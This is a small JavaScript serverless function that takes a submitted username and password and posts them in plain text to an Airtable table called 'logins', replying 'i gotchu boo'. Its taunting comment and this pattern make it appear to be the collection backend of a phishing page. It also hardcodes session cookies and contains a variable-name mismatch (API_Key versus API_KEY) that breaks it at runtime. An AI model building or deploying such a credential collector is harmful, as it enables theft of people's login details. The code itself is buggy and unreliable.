// you thought this was going to be easy, huh
import { json } from 'micro';
export default async function(req, res) {
    const API_Key = process.env.API_KEY;
    if (!API_KEY){
        return res.status(500).json({message: "no api key :("})
    }
    const data = await json(req)
    const {username, password } = data;
    const myHeaders = new Headers();
myHeaders.append("Authorization", API_KEY);
myHeaders.append("Content-Type", "application/json");
myHeaders.append("Cookie", "brw=brwtcGK1QAbqebbws; brwConsent=opt-in; AWSALBTG=05EdyotyuE+/rdSRD+10ASSNIr4LQdBvhypgba7SRyIq6cCVn45d0C5PTOl4+YKC1Hnlwc54PGBe7HgSJgGxdN3cRVah/j9XrB5C1ij6VhI43rR4M1N6oNyPbRGfJgs3S6P9T8Uk7kp/w2mKtoJ0VboBl90PkhRaOkgxlC0cwkeUgseipug=; AWSALBTGCORS=05EdyotyuE+/rdSRD+10ASSNIr4LQdBvhypgba7SRyIq6cCVn45d0C5PTOl4+YKC1Hnlwc54PGBe7HgSJgGxdN3cRVah/j9XrB5C1ij6VhI43rR4M1N6oNyPbRGfJgs3S6P9T8Uk7kp/w2mKtoJ0VboBl90PkhRaOkgxlC0cwkeUgseipug=");

const raw = JSON.stringify({
  "records": [
    {
      "fields": {
        "username": username,
        "password": password
      }
    }
  ]
});

const requestOptions = {
  method: "POST",
  headers: myHeaders,
  body: raw,
  redirect: "follow"
};

fetch("https://api.airtable.com/v0/appXXbVu5p4uSKViT/logins", requestOptions)
  .then((response) => response.text())
  .then((result) => console.log(result))
  .catch((error) => console.error(error));

    res.status(200).json({ message:'i gotchu boo'})
}